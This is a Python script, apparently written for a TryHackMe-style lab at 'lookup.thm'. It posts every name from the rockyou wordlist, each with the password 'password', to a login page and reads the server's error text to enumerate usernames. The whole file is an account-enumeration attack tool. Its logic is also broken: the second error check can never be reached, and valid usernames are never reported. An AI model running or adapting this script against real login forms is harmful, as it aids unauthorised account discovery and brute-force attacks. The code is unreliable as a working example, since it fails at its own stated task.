import requests

# target URL for username validation
target_url = "http://lookup.thm/login.php"  

username_file = "/usr/share/wordlists/rockyou.txt"

try:
    with open(username_file, "r") as file:
        for line in file:
            username = line.strip() # Remove whitespace
            if not username: # skip empty lines
                continue
            
            payload = {"username": username, 
                       "password": "password"}

            try:
                # Sending POST request to the server         
                response = requests.post(target_url, data=payload)
                
                if "wrong username" in response.text:
                    print(f"{username} is invalid")
                elif "wrong username or password" in response.text:
                    print(f"{username} is invalid")
            
            except requests.RequestException as e:
                print(f"Request error for {username}: {e}")
except FileNotFoundError:
    print(f"Wordlist file {username_file} not found.")
except Exception as e:
    print(f"An error occurred: {e}")
    